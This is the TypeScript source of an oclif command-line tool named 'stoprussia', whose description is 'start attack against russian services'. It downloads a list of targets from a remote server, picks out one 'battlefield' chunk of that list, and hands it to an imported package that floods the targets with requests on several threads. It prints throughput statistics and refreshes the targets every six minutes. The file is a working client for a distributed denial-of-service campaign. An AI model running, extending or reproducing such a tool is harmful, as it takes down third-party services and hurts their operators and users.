import { start } from '@0x77/stoprussia';
import { Command, flags } from '@oclif/command'
import fetch from 'node-fetch'
// @ts-expect-error: no-types
import histPercentileObj = require('hdr-histogram-percentiles-obj');
import { decodeFromCompressedBase64 } from "hdr-histogram-js"

function* getChunks<T = any>(arr: T[], n: number) {
  for (let i = 0; i < arr.length; i += n) {
    yield arr.slice(i, i + n);
  }
}

const startAttack = async (flags: {
  version: void;
  help: void;
  threads: number;
  battlefield: number | undefined;
}) => {
  if (flags.threads > 4) {
    console.error('threads max is 4')
    process.exit()
  }

  if (flags.battlefield && flags.battlefield > 4) {
    console.error('battlefield max is 4')
    process.exit()
  }

  const battlefield = flags.battlefield ? flags.battlefield - 1 : new Date().getSeconds() % 4

  const res = await fetch('https://srl.0x77.dev')
  let { targets, version } = await res.json() as { targets: string[]; version?: number }

  console.log('Got targets list', targets.length, version)
  targets = [...getChunks(targets, 15)][battlefield]
  console.log(`\tbattlefield: ${battlefield + 1}\n`, `\ttargets: ${targets.length}`)

  return start(targets, flags.threads, (stats) => {
    console.log(stats.url, 'cycle', `\n\t requests: ${JSON.stringify(histPercentileObj.histAsObj(decodeFromCompressedBase64(stats.requests)))}`, `\n\t throughput: ${JSON.stringify(histPercentileObj.histAsObj(decodeFromCompressedBase64(stats.throughput)))}`)
  })
}

class Stoprussia extends Command {
  static description = 'start attack against russian services'

  static flags = {
    version: flags.version({ char: 'v' }),
    help: flags.help({ char: 'h' }),
    threads: flags.integer({ char: 't', default: 1 }),
    battlefield: flags.integer({ char: 'b', description: 'number to section to attack, min: 1 / max: 4' })
  }

  async run() {
    console.log('https://github.com/0x77dev/stoprussia')
    const { flags } = this.parse(Stoprussia)

    let stop = await startAttack(flags)

    setInterval(async () => {
      console.log('Reloading')
      await stop()
      stop = await startAttack(flags)
    }, 360000)

    process.on('SIGINT', async () => {
      await stop()
      process.exit()
    })
  }
}

export = Stoprussia
